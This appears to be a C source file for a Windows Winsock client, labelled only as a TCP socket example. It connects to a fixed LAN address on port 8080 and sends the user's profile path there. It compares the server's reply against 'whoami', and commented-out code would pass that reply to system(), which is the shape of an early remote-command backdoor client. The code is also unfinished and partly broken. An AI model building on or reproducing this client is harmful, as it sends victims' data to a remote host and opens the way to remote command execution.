/*
    Create a TCP socket
*/
 
#include<stdio.h>
#include<winsock2.h>
#include <windows.h>
#include <Lmcons.h>
#include <string.h>
#pragma comment(lib,"ws2_32.lib") //Winsock Library
int main(int argc , char *argv[])
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char *message , server_reply[2000], test[2000];
    int recv_size,i;
 	char command[50];
 	char username[UNLEN+1];
 	// char* ls = GetStdoutFromCommand("ls -la");
	DWORD username_len = UNLEN+1;
    printf("\nInitialising The Socket...");
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0)
    {
        printf("Failed. Error Code : %d",WSAGetLastError());
        return 1;
    }
     
    printf("Initialised.\n");
     
    //Create a socket
    if((s = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)
    {
        printf("Could not create socket : %d" , WSAGetLastError());
    }
 
    printf("Socket created.\n");
     
     
    server.sin_addr.s_addr = inet_addr("192.168.0.104");
    server.sin_family = AF_INET;
    server.sin_port = htons( 8080 );
 
    //Connect to remote server
    if (connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)
    {
        puts("connect error");
        return 1;
    }
     
    puts("Connected");
     
    //Send some data
    
    message = getenv("USERPROFILE");
    if( send(s , message , strlen(message) , 0) < 0)
    {
        puts("Send failed");
        return 1;
    }
    puts("Data Send\n");
     
    //Receive a reply from the server
    if((recv_size = recv(s , server_reply , 2000 , 0)) == SOCKET_ERROR)
    {
        puts("recv failed");
    }
    else{
    	puts("Reply received\n");
	    //Add a NULL terminating character to make it a proper string before printing
	   	strcpy( test, "whoami" );
	    server_reply[recv_size] = '\0';
	    printf("%d\n",strlen(server_reply) );
	    printf("%d\n",strlen(test) );
	   	// for (i = 0; i < strlen(server_reply); ++i)
	   	// {
	   	// 	printf("%c\n",&server_reply[i]);
	   	// }
	   	// printf("\n");
	   	// for (i = 0; i < strlen(test); ++i)
	   	// {
	   	// 	printf("%c\n",&test[i]);
	   	// }
	   	puts(server_reply);
	   	puts(test);

	    printf("%d\n", strcmp(server_reply,test));
	    // if(strcmp(server_reply,command)){
	    	
	    // 	strcpy( command, "whoami" );
   		// 	system(command);
	    	
	    // }
	    // else{
	    // 	puts("Failed");
	    // }
	    
    	message = getenv("USERPROFILE");
    	
	    if( send(s , message , strlen(message) , 0) < 0){
	        puts("Send failed");
	        return 1;
	    }
	    puts("Data Send\n");
		strcpy(command, "dir" );
   		if(system(command)==-1){
   			puts("Command Failed");
   		}
	    
	   
	}

     
    
 
return 0;
getch();
}
